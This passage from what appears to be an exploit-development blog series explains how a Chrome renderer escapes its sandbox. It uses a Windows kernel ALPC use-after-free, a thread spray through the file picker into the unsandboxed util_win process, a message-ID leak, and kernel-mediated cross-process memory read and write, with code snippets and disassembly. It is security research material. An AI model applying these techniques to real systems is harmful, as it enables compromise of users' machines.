+&lt;p&gt;So this &lt;code&gt;Depth&lt;/code&gt; isn&amp;#x2019;t the number of items currently held &amp;#x2014; it&amp;#x2019;s an allowance deciding how many will be accepted. The actual count lives separately inside &lt;code&gt;ListHead&lt;/code&gt;, and this function never touches the SLIST at all &amp;#x2014; it only edits the allowance number. So when it goes &lt;code&gt;-10&lt;/code&gt; above, it doesn&amp;#x2019;t mean cached slabs get thrown away &amp;#x2014; it means the headroom for accepting future ones shrinks.&lt;/p&gt;
+&lt;aside&gt;
+&amp;#x1F4A1;
+
+To sum up, this bucket only opens once you convince the kernel that it&amp;apos;s a **&amp;quot;frequently used size&amp;quot;**.
+
+This is exactly why the `prime_lookaside` we&amp;apos;ll see later keeps creating and destroying threads. It isn&amp;apos;t trying to pre-fill the slots &amp;#x2014; it&amp;apos;s **deliberately generating misses to push `Depth` up**.
+
+&lt;/aside&gt;
+
+&lt;p&gt;Of course, in practice this ordering does get broken sometimes, and sometimes a completely unrelated allocation snatches the slab I freed first. So now it&amp;#x2019;s time to look at how we stop that, and who we get to take the spot, right?&lt;/p&gt;
+&lt;h1 id=&#34;2-Taking-the-Slab-Back&#34;&gt;&lt;a href=&#34;#2-Taking-the-Slab-Back&#34; class=&#34;headerlink&#34; title=&#34;2. Taking the Slab Back&#34;&gt;&lt;/a&gt;2. Taking the Slab Back&lt;/h1&gt;&lt;p&gt;Chapter 1 gave us all the conditions. &lt;strong&gt;An alloc just has to come right after the free, and it doesn&amp;#x2019;t matter if that alloc belongs to somebody else&amp;#x2019;s process.&lt;/strong&gt; So now we can actually go do it! &amp;#x2026; is what I thought, but of course it doesn&amp;#x2019;t work.. &amp;#x1F607;&lt;/p&gt;
+&lt;h2 id=&#34;2-1-Two-Reasons-Reclaim-Doesn&amp;#x2019;t-Just-Work&#34;&gt;&lt;a href=&#34;#2-1-Two-Reasons-Reclaim-Doesn&amp;#x2019;t-Just-Work&#34; class=&#34;headerlink&#34; title=&#34;2.1 Two Reasons Reclaim Doesn&amp;#x2019;t Just Work&#34;&gt;&lt;/a&gt;2.1 Two Reasons Reclaim Doesn&amp;#x2019;t Just Work&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;If the bucket isn&amp;#x2019;t warmed up, you can&amp;#x2019;t even start&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This is the thing we just saw. If &lt;code&gt;Depth&lt;/code&gt; is close to 0, the slab I freed can&amp;#x2019;t get onto the SLIST. It flows straight into the VS backend&amp;#x2019;s RB-tree. At that point LIFO becomes somebody else&amp;#x2019;s story, and nobody knows where the next &lt;code&gt;0xa80&lt;/code&gt; allocation will pick anything up from.&lt;/p&gt;
+&lt;p&gt;And this doesn&amp;#x2019;t just end in a plain &amp;#x201C;failure&amp;#x201D;. The RB-tree side does best-fit plus coalescing, so the contents of the slab that comes back are completely scrambled. Later the kernel believes that spot is an &lt;code&gt;_ETHREAD&lt;/code&gt; and reads a fixed offset (we&amp;#x2019;ll see exactly where in Chapter 3), and if what&amp;#x2019;s sitting there is garbage, the kernel dies right on the spot. So the price of a failed reclaim is, once again, a BSOD..&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Somebody else grabs it first&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Hard LIFO, flipped around, also means &lt;strong&gt;whoever cuts in line owns it&lt;/strong&gt;. If even a single identical &lt;code&gt;0xa80&lt;/code&gt; allocation cuts in between the moment I free and the moment the process I want allocates, that slab goes to them.&lt;/p&gt;
+&lt;p&gt;The problem is that this &amp;#x201C;somebody else&amp;#x201D; is usually ourselves!!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image7.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The Chromium renderer creates and destroys threads even when it&amp;#x2019;s sitting idle. Thread pools, IO, Mojo&amp;#x2026; it&amp;#x2019;s all noise.&lt;/li&gt;
+&lt;li&gt;Even the &lt;code&gt;prime_lookaside&lt;/code&gt; threads I create myself to warm the bucket are competitors.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;What happens if our own renderer takes that spot? The dangling pointer ends up &lt;strong&gt;pointing at itself&lt;/strong&gt;. From the kernel&amp;#x2019;s point of view everything works perfectly fine, but we end up reading and writing a renderer that&amp;#x2019;s locked inside the Untrusted IL sandbox. There&amp;#x2019;s no way out.&lt;/p&gt;
+&lt;p&gt;To sum up, reclaim has to clear two gates: keeping the bucket open, and making sure the process I want is the one that takes the spot. Let&amp;#x2019;s start with the second. Once we know who fills it, we also know when to warm the bucket &amp;#x2014; so who on earth is going to create threads on my behalf?&lt;/p&gt;
+&lt;h2 id=&#34;2-2-Thread-Spray-via-the-File-Picker&#34;&gt;&lt;a href=&#34;#2-2-Thread-Spray-via-the-File-Picker&#34; class=&#34;headerlink&#34; title=&#34;2.2 Thread Spray via the File Picker&#34;&gt;&lt;/a&gt;2.2 Thread Spray via the File Picker&lt;/h2&gt;&lt;p&gt;There was only one thing we needed: a Medium IL process that creates threads on our timing!&lt;/p&gt;
+&lt;p&gt;But we&amp;#x2019;re locked inside an Untrusted IL renderer. There&amp;#x2019;s no way to tell somebody else&amp;#x2019;s process &amp;#x201C;hey, make me a thread&amp;#x201D;. If such a way exists, it can only be a path Chrome itself was built to take, right? And that path is the file picker!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;window&lt;/span&gt;.showOpenFilePicker();&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With this one line, the renderer calls &lt;code&gt;UtilWin::CallExecuteSelectFile&lt;/code&gt; over Mojo, and the browser spawns a separate process called util_win. Look at the command line and you&amp;#x2019;ll immediately see why this is our target.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image8.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs fsharp&#34;&gt;--utility-sub-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt;&lt;/span&gt;=chrome.mojom.UtilWin
+--service-sandbox-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt;&lt;/span&gt;=none&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;There is no sandbox at all.&lt;/strong&gt; And it&amp;#x2019;s Medium IL. In Step 4, OUYA77 showed us how Chrome locks itself down, but the file picker alone has to load shell extensions and COM, so it simply couldn&amp;#x2019;t be locked down&amp;#x2026;!! (ba dum tss)&lt;/p&gt;
+&lt;p&gt;And what util_win does is &lt;code&gt;CoCreateInstance(CLSID_FileOpenDialog)&lt;/code&gt;. The moment COM is initialized as an STA, combase and rpcrt4 spin up thread pools and RPC threads all at once. With a single picker call, &lt;code&gt;_ETHREAD&lt;/code&gt; objects get freshly allocated &amp;#x2014; 8~16 of them.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image9.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;That one line we mentioned back in 1.1 pays off right here. One &lt;code&gt;NtCreateThreadEx&lt;/code&gt; equals one &lt;code&gt;0xa80&lt;/code&gt;. With a single line of JS, we make somebody else&amp;#x2019;s Medium IL process allocate our size class in bulk!&lt;/p&gt;
+&lt;p&gt;That said, not just any thread will do. During the first few ms of the file picker being created, what gets made are the ntdll parallel loader&amp;#x2019;s worker threads, and these guys &lt;strong&gt;die the instant loading finishes.&lt;/strong&gt; And on their way out they free the slab we worked so hard to feed them. It&amp;#x2019;s like reclaiming it and then spitting it right back out.. &amp;#x1F92E;&lt;/p&gt;
+&lt;p&gt;The window we&amp;#x2019;re after is &lt;strong&gt;the COM initialization burst&lt;/strong&gt;. It arrives tens to hundreds of ms after the dialog request goes in. And the threads created here stay alive the whole time the dialog is open. Also, what we&amp;#x2019;re after isn&amp;#x2019;t &amp;#x201C;any allocation of size &lt;code&gt;0xa80&lt;/code&gt;&amp;#x201C; &amp;#x2014; it has to be &lt;strong&gt;a real thread&lt;/strong&gt;. The kernel believes that spot is an &lt;code&gt;_ETHREAD&lt;/code&gt; and reads a fixed offset. If some other object that merely matches in size sits there, the value inside is garbage &amp;#x2014; and the moment the kernel grabs that as a process, we&amp;#x2019;d hit another BSOD, right?&lt;/p&gt;
+&lt;p&gt;This is exactly why the file picker makes such a good spray primitive. &lt;strong&gt;It calls a real &lt;code&gt;CreateThread&lt;/code&gt; on our behalf!&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-3-prime-lookaside-SELF-CHECK-filtering&#34;&gt;&lt;a href=&#34;#2-3-prime-lookaside-SELF-CHECK-filtering&#34; class=&#34;headerlink&#34; title=&#34;2.3 prime_lookaside, SELF-CHECK filtering&#34;&gt;&lt;/a&gt;2.3 prime_lookaside, SELF-CHECK filtering&lt;/h2&gt;&lt;p&gt;One gate left, right? Keeping the bucket open!&lt;/p&gt;
+&lt;p&gt;But 1.2 already gave us the answer. &lt;code&gt;Depth&lt;/code&gt; only grows when misses happen, remember? So we generate misses on purpose. Repeatedly creating and destroying threads keeps triggering &lt;code&gt;0xa80&lt;/code&gt; allocations, and every alloc against an empty bucket piles on another miss. That is &lt;code&gt;prime_lookaside&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;That said, &lt;strong&gt;don&amp;#x2019;t make too many.&lt;/strong&gt; Remember the second reason from 2.1? The threads I create are competitors too. Run too many and I end up grabbing my own slab back. After a lot of trial and error, I settled on 8 as the optimal number.&lt;/p&gt;
+&lt;p&gt;The sequence goes like this.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;prime_lookaside(8) - open the bucket&lt;/li&gt;
+&lt;li&gt;showOpenFilePicker() - thread spray via util_win&lt;/li&gt;
+&lt;li&gt;WorkerThread exits - _ETHREAD free&lt;/li&gt;
+&lt;li&gt;short wait - leave room for somebody to move into the spot&lt;/li&gt;
+&lt;li&gt;&lt;del&gt;but how do we know who that somebody is?&lt;/del&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;That last line is the problem. Reclaim happens quietly inside the kernel, and nobody tells you whether it succeeded. Move on to the next step without knowing, and you may pay for it later&amp;#x2026; In fact, on my first attempt I went &amp;#x201C;huh? reclaim seems to be working fine? isn&amp;#x2019;t this easy?&amp;#x201D; and lived to regret it..&amp;#x1F62D;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image10.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So I decided to verify it. As it happens, combase has exactly the right value for this: &lt;code&gt;g_CMalloc&lt;/code&gt; &amp;#x2014; the allocator object COM goes through every time it takes and releases memory, and its first 8 bytes are a &lt;code&gt;CRetailMalloc&lt;/code&gt; vtable pointer. If the reclaim worked, we should be able to read the memory of whichever process took that spot &amp;#x2014; so let&amp;#x2019;s just read &lt;code&gt;[g_CMalloc]&lt;/code&gt;. If a genuine &lt;code&gt;CRetailMalloc&lt;/code&gt; vtable address is sitting there &amp;#x2014; let&amp;#x2019;s call this &lt;code&gt;WANT&lt;/code&gt; &amp;#x2014; then it means a healthy process with combase loaded has taken that spot. The address really was sitting there, so naturally I believed the reclaim had gone well&amp;#x2026; for a very short while, anyway..&lt;/p&gt;
+&lt;p&gt;I attached kd and looked directly at my own renderer, and that&amp;#x2019;s where I found the problem.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image11.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;rendere&lt;span class=&#34;hljs-string&#34;&gt;r&amp;apos;s [g_CMalloc]  =  WANT&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;util_win&amp;apos;&lt;/span&gt;s [g_CMalloc]  =  WANT&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;They&amp;#x2019;re the same value. Which makes sense when you think about it &amp;#x2014; the same combase is loaded in the renderer too. So getting &lt;code&gt;WANT&lt;/code&gt; back didn&amp;#x2019;t mean &amp;#x201C;reclaim succeeded&amp;#x201D;; it only meant &lt;strong&gt;&amp;#x201C;the kernel read somewhere and brought back a value&amp;#x201D;&lt;/strong&gt; &amp;#x2014; and that somewhere could have been util_win, or just my own renderer.&lt;/p&gt;
+&lt;p&gt;If the reclaim is late and my own renderer takes the spot, the gate reads that as success and marches right on. And inside Untrusted IL, &lt;code&gt;WinExec&lt;/code&gt; is blocked, so cmd would never show up..?&lt;/p&gt;
+&lt;p&gt;So how on earth do we tell these two apart?? While mulling it over, this approach came to me. I embedded an 8-byte &lt;code&gt;CTRL_MAGIC&lt;/code&gt; into the CTRL structure the exploit DLL uses, and prepared one more entry that reads that address. This becomes a value that exists only in my renderer&amp;#x2019;s address space!!&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;my renderer took it &amp;#x2192; that address is mapped, and &lt;strong&gt;the magic comes right back&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;util_win took it &amp;#x2192; that address is unmapped on their side &amp;#x2192; &lt;strong&gt;the magic never comes back!!&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;So we make it two gates instead of one!!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs applescript&#34;&gt;[g_CMalloc] == WANT        a live combase process has taken &lt;span class=&#34;hljs-keyword&#34;&gt;the&lt;/span&gt; spot..!
+        AND
+[ctrl] != CTRL_MAGIC       &lt;span class=&#34;hljs-keyword&#34;&gt;but&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;it&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;isn&amp;apos;t&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;me&lt;/span&gt;??&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So we only proceed when both gates pass, and if the magic comes back we throw that process away and wait again hehe &amp;#x270C;&amp;#xFE0F;&lt;/p&gt;
+&lt;h1 id=&#34;3-Reading-Across-Processes&#34;&gt;&lt;a href=&#34;#3-Reading-Across-Processes&#34; class=&#34;headerlink&#34; title=&#34;3. Reading Across Processes&#34;&gt;&lt;/a&gt;3. Reading Across Processes&lt;/h1&gt;&lt;h2 id=&#34;3-1-LPCP-DATA-INFO-cross-process-R-W&#34;&gt;&lt;a href=&#34;#3-1-LPCP-DATA-INFO-cross-process-R-W&#34; class=&#34;headerlink&#34; title=&#34;3.1 LPCP_DATA_INFO - cross-process R/W&#34;&gt;&lt;/a&gt;3.1 LPCP_DATA_INFO - cross-process R/W&lt;/h2&gt;&lt;p&gt;Now that we can even confirm whether the reclaim happened, it&amp;#x2019;s finally time to actually read and write memory!!! But we get stuck again right here &lt;del&gt;(how many times are we going to get stuck!!)&lt;/del&gt;. I&amp;#x2019;m currently an Untrusted IL renderer. I can&amp;#x2019;t grab a util_win handle with &lt;code&gt;OpenProcess&lt;/code&gt;, and I can&amp;#x2019;t call &lt;code&gt;ReadProcessMemory&lt;/code&gt; either. &lt;strong&gt;There&amp;#x2019;s no way to touch somebody else&amp;#x2019;s address space directly.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;So instead of doing it ourselves, we make the kernel do it for us! This is where the vulnerability we covered back in Step 5 really shines!!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;NTSTATUS &lt;span class=&#34;hljs-title&#34;&gt;NtReadRequestData&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;    HANDLE        PortHandle,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;    PPORT_MESSAGE Message,         &lt;span class=&#34;hljs-comment&#34;&gt;// the kernel finds the message in the queue by the MessageId inside this&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;    ULONG         DataEntryIndex,  &lt;span class=&#34;hljs-comment&#34;&gt;// which index into LPCP_DATA_INFO.Entries[]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;    PVOID         LocalBuffer,     &lt;span class=&#34;hljs-comment&#34;&gt;// our own buffer&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;    SIZE_T        Length,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;    PSIZE_T       ReturnLength&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;NtWriteRequestData&lt;/code&gt; has exactly the same signature. Only the direction is reversed!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs arduino&#34;&gt;NtReadRequestData    target &lt;span class=&#34;hljs-built_in&#34;&gt;process&lt;/span&gt;[Entries[i].BaseAddress]  &amp;#x2192;  our &lt;span class=&#34;hljs-built_in&#34;&gt;buffer&lt;/span&gt;
+NtWriteRequestData   our &lt;span class=&#34;hljs-built_in&#34;&gt;buffer&lt;/span&gt;  &amp;#x2192;  target &lt;span class=&#34;hljs-built_in&#34;&gt;process&lt;/span&gt;[Entries[i].BaseAddress]&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Which process the &amp;#x201C;target process&amp;#x201D; actually is isn&amp;#x2019;t something I decide &amp;#x2014; the kernel decides on its own. And how it decides is exactly the story I put off back in 2.1.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image12.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;LpcpCopyRequestData&lt;/code&gt; &amp;#x2014; traced step by step, this is what it does.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Find the message in the port queue using Message&amp;#x2019;s MessageId.&lt;/li&gt;
+&lt;li&gt;msg + 0x20  &amp;#x2192;  WaitingThread   &amp;#x2190; the _ETHREAD we freed&lt;/li&gt;
+&lt;li&gt;[WaitingThread + 0x220]  &amp;#x2192;  Process   &amp;#x2190; that thread&amp;#x2019;s owning process&lt;/li&gt;
+&lt;li&gt;Attach to that process and copy&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The &lt;code&gt;WaitingThread&lt;/code&gt; in step 2 is that dangling pointer we created back in Step 5, and the &lt;code&gt;+0x220&lt;/code&gt; in step 3 is the offset I meant back in 2.1 when I said &amp;#x201C;the kernel reads a fixed offset&amp;#x201D;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;nt!LpcpCopyRequestData+0x1aa:
+  mov  rax, qword ptr [rsp+48h]     ; the message we found
+  mov  r9,  qword ptr [rax+20h]     ; msg + 0x20  =  WaitingThread
+  test r9, r9
+  jne  ...&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The second line is exactly where that dangling pointer gets pulled out. And what comes right after is a single &lt;code&gt;test r9, r9&lt;/code&gt;. &lt;strong&gt;It only checks for NULL &amp;#x2014; it never checks whether that&amp;#x2019;s actually a live thread.&lt;/strong&gt; This is precisely the crack we dig into.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;nt!LpcpCopyRequestData+0x270:
+  mov  rcx, qword ptr [r8+0B8h]     ; our process
+  mov  r8,  qword ptr [r9+220h]     ; WaitingThread + 0x220  =  target process
+  mov  r9,  qword ptr [rsp+60h]     ; the entry&amp;apos;s BaseAddress
+  mov  rdx, qword ptr [rsp+0E0h]    ; our buffer
+
+nt!LpcpCopyRequestData+0x28d:
+  mov  r8,  qword ptr [r8+0B8h]     ; our process
+  mov  rcx, qword ptr [r9+220h]     ; target process
+  mov  r9,  qword ptr [rsp+0E0h]    ; our buffer
+  mov  rdx, qword ptr [rsp+60h]     ; the entry&amp;apos;s BaseAddress
+
+nt!LpcpCopyRequestData+0x2a8:
+  call nt!MiCopyVirtualMemory&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You can see there are two blocks, right? And they&amp;#x2019;re perfectly symmetric. Unpacking them as &lt;code&gt;MiCopyVirtualMemory(From, FromAddr, To, ToAddr, &amp;#x2026;)&lt;/code&gt; gives us this.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs arduino&#34;&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x270&lt;/span&gt;    our &lt;span class=&#34;hljs-built_in&#34;&gt;buffer&lt;/span&gt;      &amp;#x2192;  target &lt;span class=&#34;hljs-built_in&#34;&gt;process&lt;/span&gt;   =  Write
++&lt;span class=&#34;hljs-number&#34;&gt;0x28d&lt;/span&gt;    target &lt;span class=&#34;hljs-built_in&#34;&gt;process&lt;/span&gt;  &amp;#x2192;  our &lt;span class=&#34;hljs-built_in&#34;&gt;buffer&lt;/span&gt;       =  Read&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And what splits these two is a single byte, &lt;code&gt;cl&lt;/code&gt;, taken at the very top of the function. Read or write, &lt;strong&gt;they both end up entering the same function, and only one flag decides the direction&lt;/strong&gt;!&lt;/p&gt;
+&lt;p&gt;Originally this slot pointed at the thread that sent the message &amp;#x2014; that is, the renderer. The moment we kill that thread and util_win reclaims the spot, that very same pointer points at &lt;strong&gt;a live thread inside util_win&lt;/strong&gt;. The kernel doesn&amp;#x2019;t think anything is off. It just attaches to util_win as told and copies away!! &amp;#x1F929;&lt;/p&gt;
+&lt;p&gt;That said, two constraints come attached.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Writes only work on writable pages&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The kernel validates addresses against UserMode. Reading works on &lt;code&gt;.text&lt;/code&gt; or &lt;code&gt;.rdata&lt;/code&gt; alike, but writing requires a page that is writable at runtime. This becomes the decisive constraint when we pick &amp;#x201C;what to overwrite&amp;#x201D; in Chapter 4.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;The addresses to read and write must be decided up front&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The entry&amp;#x2019;s &lt;code&gt;BaseAddress&lt;/code&gt; gets copied to the kernel&amp;#x2019;s own side at the moment the message is sent. Changing the value in our buffer afterwards does nothing. So &amp;#x201C;let&amp;#x2019;s reclaim first and decide the addresses later&amp;#x201D; simply isn&amp;#x2019;t an option. &lt;strong&gt;Everything about where we&amp;#x2019;ll read and write has to be decided before we pull the trigger..!!&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;3-2-Message-ID-leak&#34;&gt;&lt;a href=&#34;#3-2-Message-ID-leak&#34; class=&#34;headerlink&#34; title=&#34;3.2 Message ID leak&#34;&gt;&lt;/a&gt;3.2 Message ID leak&lt;/h2&gt;&lt;p&gt;3.1 built all the tools. But to call &lt;code&gt;NtReadRequestData&lt;/code&gt;, we needed one more argument. That would be &lt;code&gt;PPORT_MESSAGE Message&lt;/code&gt;!&lt;/p&gt;
+&lt;p&gt;The kernel doesn&amp;#x2019;t use that buffer as data. &lt;strong&gt;It uses the &lt;code&gt;MessageId&lt;/code&gt; inside it to find the message in the port queue.&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs vbnet&#34;&gt;we don&lt;span class=&#34;hljs-comment&#34;&gt;&amp;apos;t know the Message ID  &amp;#x2192;  the kernel can&amp;apos;t find the message  &amp;#x2192;  the call itself fails&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In effect, no matter how well the reclaim goes, if we can&amp;#x2019;t point at that message we can&amp;#x2019;t do anything. The problem is that we don&amp;#x2019;t get to choose the MID &amp;#x2014; it&amp;#x2019;s a handle the kernel issues itself when it puts the message on the queue. Not a counter that climbs in order, but a value whose upper bits select a table and whose remainder is an index, so there is no guessing it. And the thread that sent that message? We killed it with our own hands to create the UAF.&lt;/p&gt;
+&lt;p&gt;So for a while I thought this was impossible&amp;#x2026; Digging into the kernel&amp;#x2019;s lookup path, it splits that handle apart, pulls the message out of a global table, and the &lt;code&gt;MessageId&lt;/code&gt; on the message it pulled has to match the value we handed in exactly. &amp;#x1F50D;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image13.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;But I was mistaken. There was no need to invent a MID at all..? If you call &lt;code&gt;NtAlpcSendWaitReceivePort&lt;/code&gt; on the same port in &lt;strong&gt;receive-only, no-send&lt;/strong&gt; mode, the kernel hands the message sitting on the queue right back into our buffer. And the &lt;code&gt;MessageId&lt;/code&gt; the kernel assigned will be sitting right there, won&amp;#x2019;t it?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;BYTE* recvBuf = VirtualAlloc(&lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;, ...);
+ULONG recvLen = &lt;span class=&#34;hljs-number&#34;&gt;0x200&lt;/span&gt;;
+LARGE_INTEGER timeout; timeout.QuadPart = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+
+NtAlpcSendWaitReceivePort(hPort, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;,
+                          recvBuf, &amp;amp;recvLen, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;timeout);
+
+ULONG mid = *(ULONG*)(recvBuf + &lt;span class=&#34;hljs-number&#34;&gt;0x18&lt;/span&gt;);   &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2190; right here&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Printing it for real gives us this.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;st_recv&lt;/span&gt;       = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; (SUCCESS)
+&lt;span class=&#34;hljs-attribute&#34;&gt;recvLen&lt;/span&gt;       = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;
+&lt;span class=&#34;hljs-attribute&#34;&gt;recvBuf&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;18&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;18&lt;/span&gt;      &amp;#x2190; MID leak!&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;No need to break the condition &amp;#x2014; &lt;strong&gt;we simply received a number that already satisfies it.&lt;/strong&gt; After all, it&amp;#x2019;s a value the kernel issued itself!&lt;/p&gt;
+&lt;p&gt;And we can hand this &lt;code&gt;recvBuf&lt;/code&gt; straight to &lt;code&gt;NtReadRequestData&lt;/code&gt; / &lt;code&gt;NtWriteRequestData&lt;/code&gt; as the &lt;code&gt;Message&lt;/code&gt; argument. The kernel reads the MID inside it on its own. In this state both reads and writes come back SUCCESS, and whatever we write reads back exactly as written. &lt;strong&gt;We can finally read and write the memory of a Medium process!!&lt;/strong&gt; &amp;#x1F389;&lt;/p&gt;
+&lt;p&gt;But one thing here &amp;#x2014; how did we know the addresses to read and write in the first place? Normally a chain like this starts with a base leak, right?&lt;/p&gt;
+&lt;p&gt;The hint came from the very place we got stuck earlier: &lt;code&gt;ntdll&lt;/code&gt; &amp;#xB7; &lt;code&gt;combase&lt;/code&gt; &amp;#xB7; &lt;code&gt;kernel32&lt;/code&gt; are all KnownDLLs, so within a single boot they load at the same address even in different processes. &lt;code&gt;chrome.dll&lt;/code&gt; is the same image too, so it&amp;#x2019;s no different. Which means that if we call &lt;code&gt;GetModuleHandleA&lt;/code&gt; once in our renderer, &lt;strong&gt;that value holds in util_win too, exactly as-is!!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;We do exactly the same thing in the later exploitation steps. Even the fake vtable we&amp;#x2019;ll build later is a copy of the real &lt;code&gt;CRetailMalloc&lt;/code&gt; vtable, &lt;strong&gt;read straight out of our own renderer&amp;#x2019;s combase&lt;/strong&gt;!!&lt;/p&gt;
